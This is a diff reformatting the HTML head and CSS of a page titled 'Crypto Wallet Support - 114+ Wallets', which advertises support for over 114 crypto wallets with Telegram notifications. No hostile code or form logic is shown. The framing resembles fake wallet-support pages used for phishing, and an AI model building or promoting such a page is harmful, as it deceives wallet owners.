@@ -1,1713 +1,2424 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="apple-mobile-web-app-title" content="CryptoWallet">
-  <meta name="description" content="Get instant support for 114+ cryptocurrency wallets with professional issue tracking and Telegram notifications.">
-  <meta property="og:title" content="Crypto Wallet Support - 114+ Wallets">
-  <meta property="og:description" content="Professional support for all major cryptocurrency wallets">
-  <meta property="og:type" content="website">
-  <title>Crypto Wallet Support - 114+ Wallets</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <script>
-    const theme = localStorage.getItem('theme') || 'light';
-    if (theme === 'dark') {
-      document.documentElement.classList.add('dark');
-    }
-  </script>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-      -webkit-user-select: none;
-      -webkit-touch-callout: none;
-    }
-
-    :root {
-      --primary: 219, 100%, 37%;
-      --secondary: 211, 100%, 52%;
-      --accent: 216, 98%, 52%;
-      --background: 210, 40%, 98%;
-      --foreground: 217, 33%, 17%;
-      --card: 0, 0%, 100%;
-      --card-border: 210, 40%, 93%;
-      --border: 210, 40%, 90%;
-      --muted: 210, 25%, 85%;
-      --muted-foreground: 217, 15%, 45%;
-      --destructive: 0, 84%, 60%;
-    }
-
-    html.dark {
-      --primary: 219, 100%, 45%;
-      --secondary: 211, 100%, 55%;
-      --accent: 216, 98%, 58%;
-      --background: 217, 30%, 15%;
-      --foreground: 210, 40%, 96%;
-      --card: 217, 28%, 22%;
-      --card-border: 217, 28%, 35%;
-      --border: 217, 28%, 32%;
-      --muted: 217, 25%, 40%;
-      --muted-foreground: 210, 20%, 65%;
-    }
-
-    body {
-      font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background-color: hsl(var(--background));
-      color: hsl(var(--foreground));
-      transition: background-color 0.3s, color 0.3s;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    /* Header - Mobile First */
-    header {
-      background: hsl(var(--primary));
-      border-bottom: 1px solid hsl(var(--primary), 0.8);
-      padding: 0.6rem 0.5rem;
-      position: sticky;
-      position: -webkit-sticky;
-      top: 0;
-      z-index: 100;
-      line-height: 1;
-      -webkit-user-select: none;
-      user-select: none;
-    }
-
-    .header-content {
-      max-width: 1200px;
-      margin: 0 auto;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: nowrap;
-      gap: 0.4rem;
-      overflow-x: auto;
-      padding: 0 0.25rem;
-    }
-
-    @media (min-width: 480px) {
-      header {
-        padding: 0.75rem 1rem;
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes"
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta
+      name="apple-mobile-web-app-status-bar-style"
+      content="black-translucent"
+    />
+    <meta name="apple-mobile-web-app-title" content="CryptoWallet" />
+    <meta
+      name="description"
+      content="Get instant support for 114+ cryptocurrency wallets with professional issue tracking and Telegram notifications."
+    />
+    <meta property="og:title" content="Crypto Wallet Support - 114+ Wallets" />
+    <meta
+      property="og:description"
+      content="Professional support for all major cryptocurrency wallets"
+    />
+    <meta property="og:type" content="website" />
+    <title>Crypto Wallet Support - 114+ Wallets</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>
+      const theme = localStorage.getItem("theme") || "light";
+      if (theme === "dark") {
+        document.documentElement.classList.add("dark");
       }
-      
-      .header-content {
-        gap: 0.75rem;
+    </script>
+    <style>
+      * {
+        margin: 0;
         padding: 0;
+        box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        -webkit-user-select: none;
+        -webkit-touch-callout: none;
       }
-    }
 
-    .logo-section {
-      display: flex;
-      align-items: center;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      text-decoration: none;
-      transition: all 0.3s;
-    }
-
-    .wc-logo {
-      width: 2.2rem;
-      height: 2.2rem;
-      margin-left: 0.5rem;
-      flex-shrink: 0;
-    }
-
-    .logo-icon {
-      width: 2rem;
-      height: 2rem;
-      background: linear-gradient(135deg, hsl(var(--primary)), hsl(var(--secondary)));
-      border-radius: 0.6rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 0.9rem;
-      flex-shrink: 0;
-      font-weight: 700;
-    }
-
-    @media (min-width: 480px) {
-      .logo-icon {
-        width: 2.5rem;
-        height: 2.5rem;
-        font-size: 1.25rem;
+      :root {
+        --primary: 219, 100%, 37%;
+        --secondary: 211, 100%, 52%;
+        --accent: 216, 98%, 52%;
+        --background: 210, 40%, 98%;
+        --foreground: 217, 33%, 17%;
+        --card: 0, 0%, 100%;
+        --card-border: 210, 40%, 93%;
+        --border: 210, 40%, 90%;
+        --muted: 210, 25%, 85%;
+        --muted-foreground: 217, 15%, 45%;
+        --destructive: 0, 84%, 60%;
       }
-    }
 
-    .logo-text {
-      display: none;
-      flex-direction: column;
-    }
+      html.dark {
+        --primary: 219, 100%, 45%;
+        --secondary: 211, 100%, 55%;
+        --accent: 216, 98%, 58%;
+        --background: 217, 30%, 15%;
+        --foreground: 210, 40%, 96%;
+        --card: 217, 28%, 22%;
+        --card-border: 217, 28%, 35%;
+        --border: 217, 28%, 32%;
+        --muted: 217, 25%, 40%;
+        --muted-foreground: 210, 20%, 65%;
+      }
 
-    .logo-title {
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: white;
-    }
-
-    .logo-subtitle {
-      font-size: 0.7rem;
-      color: rgba(255, 255, 255, 0.8);
-      font-weight: 500;
-    }
-
-    @media (min-width: 480px) {
-      .logo-text {
+      body {
+        font-family:
+          "DM Sans",
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          sans-serif;
+        background-color: hsl(var(--background));
+        color: hsl(var(--foreground));
+        transition:
+          background-color 0.3s,
+          color 0.3s;
+        line-height: 1.6;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        min-height: 100vh;
         display: flex;
-      }
-    }
-
-    .nav-buttons {
-      display: flex;
-      gap: 0.5rem;
-      align-items: center;
-      flex-wrap: nowrap;
-      flex-shrink: 0;
-    }
-
-    @media (max-width: 640px) {
-      .nav-buttons {
-        gap: 0.3rem;
-      }
-    }
-
-    button {
-      cursor: pointer;
-      border: none;
-      background: none;
-      font-family: inherit;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      appearance: none;
-      -webkit-user-select: none;
-      user-select: none;
-    }
-
-    .theme-toggle {
-      padding: 0.4rem;
-      border-radius: 0.5rem;
-      background: rgba(255, 255, 255, 0.2);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      color: white;
-      transition: all 0.3s;
-      width: 2.2rem;
-      height: 2.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      font-size: 0.9rem;
-    }
-
-    @media (min-width: 480px) {
-      .theme-toggle {
-        width: 2.5rem;
-        height: 2.5rem;
-        padding: 0.5rem;
-        font-size: 1rem;
-      }
-    }
-
-    .theme-toggle:hover {
-      background: rgba(255, 255, 255, 0.3);
-    }
-
-    .language-switcher {
-      margin: 0 0.3rem;
-      flex-shrink: 0;
-    }
-
-    .language-switcher select {
-      padding: 0.45rem 0.6rem;
-      border-radius: 0.5rem;
-      background: rgba(255, 255, 255, 0.2);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      color: white;
-      font-family: inherit;
-      cursor: pointer;
-      font-size: 0.75rem;
-      transition: all 0.3s;
-      flex-shrink: 0;
-      position: relative;
-      z-index: 1000;
-    }
-
-    .language-switcher select:hover {
-      background: rgba(255, 255, 255, 0.3);
-    }
-
-    .language-switcher select:focus {
-      outline: none;
-      border-color: white;
-      box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.2);
-    }
-
-    @media (min-width: 480px) {
-      .language-switcher select {
-        font-size: 0.8rem;
-        padding: 0.4rem 0.6rem;
-      }
-    }
-
-    @media (min-width: 768px) {
-      .language-switcher {
-        margin: 0 0.5rem;
+        flex-direction: column;
       }
 
-      .language-switcher select {
-        font-size: 0.9rem;
-        padding: 0.5rem 0.75rem;
+      /* Header - Mobile First */
+      header {
+        background: hsl(var(--primary));
+        border-bottom: 1px solid hsl(var(--primary), 0.8);
+        padding: 0.6rem 0.5rem;
+        position: sticky;
+        position: -webkit-sticky;
+        top: 0;
+        z-index: 100;
+        line-height: 1;
+        -webkit-user-select: none;
+        user-select: none;
       }
-    }
 
-    /* Navigation Tabs */
-    .nav-tabs {
-      display: flex;
-      gap: 0.3rem;
-      flex-shrink: 0;
-    }
-
-    .nav-btn {
-      padding: 0.4rem 0.6rem;
-      border-radius: 0.4rem;
-      background: transparent;
-      color: rgba(255, 255, 255, 0.7);
-      transition: all 0.3s;
-      font-weight: 500;
-      font-size: 0.7rem;
-      white-space: nowrap;
-      display: flex;
-      align-items: center;
-      gap: 0.2rem;
-      flex-shrink: 0;
-      min-height: 32px;
-    }
-
-    .nav-btn span {
-      display: none;
-    }
-
-    @media (min-width: 480px) {
-      .nav-tabs {
+      .header-content {
+        max-width: 1200px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: nowrap;
         gap: 0.4rem;
+        overflow-x: auto;
+        padding: 0 0.25rem;
+      }
+
+      @media (min-width: 480px) {
+        header {
+          padding: 0.75rem 1rem;
+        }
+
+        .header-content {
+          gap: 0.75rem;
+          padding: 0;
+        }
+      }
+
+      .logo-section {
+        display: flex;
+        align-items: center;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        text-decoration: none;
+        transition: all 0.3s;
+      }
+
+      .wc-logo {
+        width: 2.2rem;
+        height: 2.2rem;
+        margin-left: 0.5rem;
+        flex-shrink: 0;
+      }
+
+      .logo-icon {
+        width: 2rem;
+        height: 2rem;
+        background: linear-gradient(
+          135deg,
+          hsl(var(--primary)),
+          hsl(var(--secondary))
+        );
+        border-radius: 0.6rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 0.9rem;
+        flex-shrink: 0;
+        font-weight: 700;
+      }
+
+      @media (min-width: 480px) {
+        .logo-icon {
+          width: 2.5rem;
+          height: 2.5rem;
+          font-size: 1.25rem;
+        }
+      }
+
+      .logo-text {
+        display: none;
+        flex-direction: column;
+      }
+
+      .logo-title {
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: white;
+      }
+
+      .logo-subtitle {
+        font-size: 0.7rem;
+        color: rgba(255, 255, 255, 0.8);
+        font-weight: 500;
+      }
+
+      @media (min-width: 480px) {
+        .logo-text {
+          display: flex;
+        }
+      }
+
+      .nav-buttons {
+        display: flex;
+        gap: 0.5rem;
+        align-items: center;
+        flex-wrap: nowrap;
+        flex-shrink: 0;
+      }
+
+      @media (max-width: 640px) {
+        .nav-buttons {
+          gap: 0.3rem;
+        }
+      }
+
+      button {
+        cursor: pointer;
+        border: none;
+        background: none;
+        font-family: inherit;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        -webkit-user-select: none;
+        user-select: none;
+      }
+
+      .theme-toggle {
+        padding: 0.4rem;
+        border-radius: 0.5rem;
+        background: rgba(255, 255, 255, 0.2);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        color: white;
+        transition: all 0.3s;
+        width: 2.2rem;
+        height: 2.2rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        font-size: 0.9rem;
+      }
+
+      @media (min-width: 480px) {
+        .theme-toggle {
+          width: 2.5rem;
+          height: 2.5rem;
+          padding: 0.5rem;
+          font-size: 1rem;
+        }
+      }
+
+      .theme-toggle:hover {
+        background: rgba(255, 255, 255, 0.3);
+      }
+
+      .language-switcher {
+        margin: 0 0.3rem;
+        flex-shrink: 0;
+      }
+
+      .language-switcher select {
+        padding: 0.45rem 0.6rem;
+        border-radius: 0.5rem;
+        background: rgba(255, 255, 255, 0.2);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        color: white;
+        font-family: inherit;
+        cursor: pointer;
+        font-size: 0.75rem;
+        transition: all 0.3s;
+        flex-shrink: 0;
+        position: relative;
+        z-index: 1000;
+      }
+
+      .language-switcher select:hover {
+        background: rgba(255, 255, 255, 0.3);
+      }
+
+      .language-switcher select:focus {
+        outline: none;
+        border-color: white;
+        box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.2);
+      }
+
+      @media (min-width: 480px) {
+        .language-switcher select {
+          font-size: 0.8rem;
+          padding: 0.4rem 0.6rem;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .language-switcher {
+          margin: 0 0.5rem;
+        }
+
+        .language-switcher select {
+          font-size: 0.9rem;
+          padding: 0.5rem 0.75rem;
+        }
+      }
+
+      /* Navigation Tabs */
+      .nav-tabs {
+        display: flex;
+        gap: 0.3rem;
+        flex-shrink: 0;
       }
 
       .nav-btn {
-        padding: 0.5rem 1rem;
-        font-size: 0.85rem;
-        gap: 0.4rem;
-        min-height: auto;
+        padding: 0.4rem 0.6rem;
+        border-radius: 0.4rem;
+        background: transparent;
+        color: rgba(255, 255, 255, 0.7);
+        transition: all 0.3s;
+        font-weight: 500;
+        font-size: 0.7rem;
+        white-space: nowrap;
+        display: flex;
+        align-items: center;
+        gap: 0.2rem;
+        flex-shrink: 0;
+        min-height: 32px;
       }
 
       .nav-btn span {
-        display: inline;
+        display: none;
       }
-    }
 
-    @media (hover: hover) {
-      .nav-btn:hover {
-        color: white;
-        background: rgba(255, 255, 255, 0.2);
-        transform: translateY(-2px);
+      @media (min-width: 480px) {
+        .nav-tabs {
+          gap: 0.4rem;
+        }
+
+        .nav-btn {
+          padding: 0.5rem 1rem;
+          font-size: 0.85rem;
+          gap: 0.4rem;
+          min-height: auto;
+        }
+
+        .nav-btn span {
+          display: inline;
+        }
       }
-    }
 
-    .nav-btn.active {
-      color: hsl(var(--primary));
-      background: white;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-    }
+      @media (hover: hover) {
+        .nav-btn:hover {
+          color: white;
+          background: rgba(255, 255, 255, 0.2);
+          transform: translateY(-2px);
+        }
+      }
 
-    /* Container - Mobile First */
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0.75rem 0.5rem;
-      width: 100%;
-      overflow-x: visible;
-    }
+      .nav-btn.active {
+        color: hsl(var(--primary));
+        background: white;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      }
 
-    @media (min-width: 480px) {
+      /* Container - Mobile First */
       .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0.75rem 0.5rem;
+        width: 100%;
+        overflow-x: visible;
+      }
+
+      @media (min-width: 480px) {
+        .container {
+          padding: 1.5rem;
+        }
+
+        @media (min-width: 768px) {
+          .container {
+            padding: 2rem 1.5rem;
+          }
+        }
+      }
+
+      /* Hero Section */
+      .hero {
+        text-align: center;
+        margin-bottom: 2rem;
+      }
+
+      .hero h1 {
+        font-size: 1.75rem;
+        font-weight: 700;
+        margin-bottom: 0.75rem;
+        color: hsl(var(--foreground));
+        word-break: break-word;
+        letter-spacing: -0.5px;
+      }
+
+      @media (min-width: 480px) {
+        .hero h1 {
+          font-size: 2.2rem;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .hero h1 {
+          font-size: 2.5rem;
+          margin-bottom: 1rem;
+        }
+      }
+
+      .hero p {
+        font-size: 0.9rem;
+        color: hsl(var(--muted-foreground));
+        margin-bottom: 0.4rem;
+      }
+
+      @media (min-width: 480px) {
+        .hero p {
+          font-size: 1rem;
+          margin-bottom: 0.5rem;
+        }
+      }
+
+      /* Stats */
+      .stats {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1rem;
+        margin: 1.5rem 0;
+        padding: 1.5rem 0;
+        border-top: 1px solid hsl(var(--border));
+        border-bottom: 1px solid hsl(var(--border));
+      }
+
+      @media (min-width: 480px) {
+        .stats {
+          grid-template-columns: repeat(3, 1fr);
+          gap: 1.5rem;
+        }
+      }
+
+      .stat {
+        text-align: center;
+      }
+
+      .stat-value {
+        font-size: 1.5rem;
+        font-weight: 700;
+        color: hsl(var(--primary));
+        font-variant-numeric: tabular-nums;
+      }
+
+      @media (min-width: 480px) {
+        .stat-value {
+          font-size: 1.75rem;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .stat-value {
+          font-size: 2rem;
+        }
+      }
+
+      .stat-label {
+        color: hsl(var(--muted-foreground));
+        margin-top: 0.4rem;
+        font-size: 0.8rem;
+      }
+
+      @media (min-width: 480px) {
+        .stat-label {
+          margin-top: 0.5rem;
+          font-size: 0.95rem;
+        }
+      }
+
+      /* Search Bar - Touch Friendly */
+      .search-container {
+        display: flex;
+        justify-content: center;
+        margin: 1.2rem 0;
+        padding: 0;
+      }
+
+      .search-input {
+        max-width: 600px;
+        width: 100%;
+        padding: 0.5rem 0.75rem 0.5rem 2rem;
+        border-radius: 0.5rem;
+        border: 1px solid hsl(var(--border));
+        background: hsl(var(--card));
+        color: hsl(var(--foreground));
+        font-family: inherit;
+        font-size: 0.9rem;
+        position: relative;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23ffffff'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: 0.6rem center;
+        background-size: 1rem;
+        min-height: 44px;
+      }
+
+      @media (min-width: 480px) {
+        .search-input {
+          padding: 0.65rem 1rem 0.65rem 2.5rem;
+          font-size: 0.95rem;
+          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%23ffffff'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");
+          background-position: 0.75rem center;
+          background-size: 1.25rem;
+        }
+      }
+
+      .search-input:focus {
+        outline: none;
+        border-color: hsl(var(--primary));
+        box-shadow: 0 0 0 2px hsl(var(--primary), 0.2);
+      }
+
+      /* Wallet Grid - Responsive */
+      .wallets-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
+        gap: 0.6rem;
+        margin-top: 1.2rem;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      @media (min-width: 360px) {
+        .wallets-grid {
+          grid-template-columns: repeat(auto-fill, minmax(65px, 1fr));
+          gap: 0.7rem;
+        }
+      }
+
+      @media (min-width: 480px) {
+        .wallets-grid {
+          grid-template-columns: repeat(auto-fill, minmax(75px, 1fr));
+          gap: 0.85rem;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .wallets-grid {
+          grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+          gap: 1rem;
+        }
+      }
+
+      @media (min-width: 1024px) {
+        .wallets-grid {
+          grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+          gap: 1.2rem;
+        }
+      }
+
+      .wallet-card {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 0.6rem;
+        background: hsl(var(--card));
+        border: 1px solid hsl(var(--card-border));
+        cursor: pointer;
+        transition: all 0.2s ease;
+        position: relative;
+        touch-action: manipulation;
+        -webkit-touch-callout: none;
+        -webkit-user-select: none;
+        user-select: none;
+        width: 100%;
+        padding-bottom: 100%;
+        overflow: visible;
+      }
+
+      @supports (aspect-ratio: 1) {
+        .wallet-card {
+          aspect-ratio: 1;
+          padding-bottom: 0;
+        }
+      }
+
+      .wallet-card:active {
+        transform: scale(0.92);
+      }
+
+      @media (hover: hover) {
+        .wallet-card:hover {
+          transform: translateY(-3px);
+          border-color: hsl(var(--primary));
+          box-shadow: 0 6px 20px hsl(var(--primary), 0.15);
+          background: hsl(var(--card));
+        }
+
+        .wallet-card:hover .tooltip {
+          opacity: 1;
+          pointer-events: auto;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .wallet-card {
+          border-radius: 0.5rem;
+        }
+      }
+
+      .wallet-card img {
+        max-width: 80%;
+        max-height: 80%;
+        object-fit: contain;
+      }
+
+      .wallet-icon {
+        width: 50%;
+        height: 50%;
+        color: hsl(var(--primary));
+      }
+
+      .tooltip {
+        position: absolute;
+        bottom: -2.5rem;
+        left: 50%;
+        transform: translateX(-50%);
+        background: hsl(var(--card));
+        border: 1px solid hsl(var(--card-border));
+        padding: 0.5rem 0.75rem;
+        border-radius: 0.5rem;
+        font-size: 0.75rem;
+        white-space: nowrap;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s;
+      }
+
+      /* Issues Section - Responsive Grid */
+      .issues-container {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1.2rem;
+        margin-top: 1.5rem;
+      }
+
+      @media (min-width: 768px) {
+        .issues-container {
+          grid-template-columns: 1fr 1fr;
+          gap: 2rem;
+        }
+      }
+
+      @media (min-width: 1200px) {
+        .issues-container {
+          gap: 2.5rem;
+        }
+      }
+
+      .card {
+        background: hsl(var(--card));
+        border: 1px solid hsl(var(--card-border));
+        border-radius: 0.75rem;
         padding: 1.5rem;
       }
 
       @media (min-width: 768px) {
-        .container {
-          padding: 2rem 1.5rem;
+        .card {
+          padding: 2rem;
         }
       }
-    }
 
-    /* Hero Section */
-    .hero {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-
-    .hero h1 {
-      font-size: 1.75rem;
-      font-weight: 700;
-      margin-bottom: 0.75rem;
-      color: hsl(var(--foreground));
-      word-break: break-word;
-      letter-spacing: -0.5px;
-    }
-
-    @media (min-width: 480px) {
-      .hero h1 {
-        font-size: 2.2rem;
-      }
-    }
-
-    @media (min-width: 768px) {
-      .hero h1 {
-        font-size: 2.5rem;
-        margin-bottom: 1rem;
-      }
-    }
-
-    .hero p {
-      font-size: 0.9rem;
-      color: hsl(var(--muted-foreground));
-      margin-bottom: 0.4rem;
-    }
-
-    @media (min-width: 480px) {
-      .hero p {
-        font-size: 1rem;
+      .card h2 {
+        font-size: 1.25rem;
         margin-bottom: 0.5rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        word-break: break-word;
+        color: hsl(var(--foreground));
       }
-    }
 
-    /* Stats */
-    .stats {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1rem;
-      margin: 1.5rem 0;
-      padding: 1.5rem 0;
-      border-top: 1px solid hsl(var(--border));
-      border-bottom: 1px solid hsl(var(--border));
-    }
-
-    @media (min-width: 480px) {
-      .stats {
-        grid-template-columns: repeat(3, 1fr);
-        gap: 1.5rem;
+      @media (min-width: 768px) {
+        .card h2 {
+          font-size: 1.5rem;
+        }
       }
-    }
 
-    .stat {
-      text-align: center;
-    }
-
-    .stat-value {
-      font-size: 1.5rem;
-      font-weight: 700;
-      color: hsl(var(--primary));
-      font-variant-numeric: tabular-nums;
-    }
-
-    @media (min-width: 480px) {
-      .stat-value {
-        font-size: 1.75rem;
-      }
-    }
-
-    @media (min-width: 768px) {
-      .stat-value {
-        font-size: 2rem;
-      }
-    }
-
-    .stat-label {
-      color: hsl(var(--muted-foreground));
-      margin-top: 0.4rem;
-      font-size: 0.8rem;
-    }
-
-    @media (min-width: 480px) {
-      .stat-label {
-        margin-top: 0.5rem;
+      .card p {
+        color: hsl(var(--muted-foreground));
+        margin-bottom: 1.5rem;
         font-size: 0.95rem;
       }
-    }
 
-    /* Search Bar - Touch Friendly */
-    .search-container {
-      display: flex;
-      justify-content: center;
-      margin: 1.2rem 0;
-      padding: 0;
-    }
+      .issue-item {
+        padding: 0.75rem;
+        border-radius: 0.5rem;
+        background: hsl(var(--background), 0.5);
+        border: 1px solid hsl(var(--border));
+        margin-bottom: 0.6rem;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
 
-    .search-input {
-      max-width: 600px;
-      width: 100%;
-      padding: 0.5rem 0.75rem 0.5rem 2rem;
-      border-radius: 0.5rem;
-      border: 1px solid hsl(var(--border));
-      background: hsl(var(--card));
-      color: hsl(var(--foreground));
-      font-family: inherit;
-      font-size: 0.9rem;
-      position: relative;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23ffffff'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: 0.6rem center;
-      background-size: 1rem;
-      min-height: 44px;
-    }
+      @media (hover: hover) {
+        .issue-item:hover {
+          background: hsl(var(--primary), 0.05);
+          border-color: hsl(var(--primary));
+        }
+      }
 
-    @media (min-width: 480px) {
-      .search-input {
-        padding: 0.65rem 1rem 0.65rem 2.5rem;
+      .issue-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: start;
+        margin-bottom: 0.5rem;
+        gap: 0.5rem;
+      }
+
+      .issue-title {
+        font-weight: 600;
         font-size: 0.95rem;
-        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%23ffffff'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");
-        background-position: 0.75rem center;
-        background-size: 1.25rem;
       }
-    }
 
-    .search-input:focus {
-      outline: none;
-      border-color: hsl(var(--primary));
-      box-shadow: 0 0 0 2px hsl(var(--primary), 0.2);
-    }
-
-    /* Wallet Grid - Responsive */
-    .wallets-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
-      gap: 0.6rem;
-      margin-top: 1.2rem;
-      -webkit-overflow-scrolling: touch;
-    }
-
-    @media (min-width: 360px) {
-      .wallets-grid {
-        grid-template-columns: repeat(auto-fill, minmax(65px, 1fr));
-        gap: 0.7rem;
+      .severity-badge {
+        padding: 0.2rem 0.6rem;
+        border-radius: 0.25rem;
+        font-size: 0.65rem;
+        font-weight: 600;
+        white-space: nowrap;
+        flex-shrink: 0;
       }
-    }
 
-    @media (min-width: 480px) {
-      .wallets-grid {
-        grid-template-columns: repeat(auto-fill, minmax(75px, 1fr));
-        gap: 0.85rem;
+      .severity-critical {
+        background: hsl(var(--destructive), 0.2);
+        color: hsl(var(--destructive));
       }
-    }
-
-    @media (min-width: 768px) {
-      .wallets-grid {
-        grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
-        gap: 1rem;
+      .severity-high {
+        background: hsl(12, 100%, 60%, 0.2);
+        color: hsl(12, 100%, 40%);
       }
-    }
+      .severity-medium {
+        background: hsl(45, 100%, 60%, 0.2);
+        color: hsl(45, 100%, 40%);
+      }
+      .severity-low {
+        background: hsl(var(--primary), 0.2);
+        color: hsl(var(--primary));
+      }
 
-    @media (min-width: 1024px) {
-      .wallets-grid {
-        grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+      .solution {
+        margin-top: 0.75rem;
+        padding-top: 0.75rem;
+        border-top: 1px solid hsl(var(--border));
+        font-size: 0.9rem;
+        color: hsl(var(--muted-foreground));
+        display: flex;
+        gap: 0.5rem;
+      }
+
+      .solution-icon {
+        color: #22c55e;
+        flex-shrink: 0;
+        margin-top: 0.2rem;
+      }
+
+      /* Form */
+      .form {
+        display: flex;
+        flex-direction: column;
         gap: 1.2rem;
       }
-    }
 
-    .wallet-card {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 0.6rem;
-      background: hsl(var(--card));
-      border: 1px solid hsl(var(--card-border));
-      cursor: pointer;
-      transition: all 0.2s ease;
-      position: relative;
-      touch-action: manipulation;
-      -webkit-touch-callout: none;
-      -webkit-user-select: none;
-      user-select: none;
-      width: 100%;
-      padding-bottom: 100%;
-      overflow: visible;
-    }
-
-    @supports (aspect-ratio: 1) {
-      .wallet-card {
-        aspect-ratio: 1;
-        padding-bottom: 0;
-      }
-    }
-
-    .wallet-card:active {
-      transform: scale(0.92);
-    }
-
-    @media (hover: hover) {
-      .wallet-card:hover {
-        transform: translateY(-3px);
-        border-color: hsl(var(--primary));
-        box-shadow: 0 6px 20px hsl(var(--primary), 0.15);
-        background: hsl(var(--card));
+      .form-group {
+        display: flex;
+        flex-direction: column;
       }
 
-      .wallet-card:hover .tooltip {
-        opacity: 1;
-        pointer-events: auto;
+      label {
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+        color: hsl(var(--foreground));
+        font-size: 0.9rem;
+        display: block;
       }
-    }
 
-    @media (max-width: 480px) {
-      .wallet-card {
+      input,
+      textarea,
+      select {
+        padding: 0.7rem;
+        border: 1px solid hsl(var(--border));
         border-radius: 0.5rem;
+        background: hsl(var(--background));
+        color: hsl(var(--foreground));
+        font-family: inherit;
+        font-size: 1rem;
+        transition: all 0.3s;
+        width: 100%;
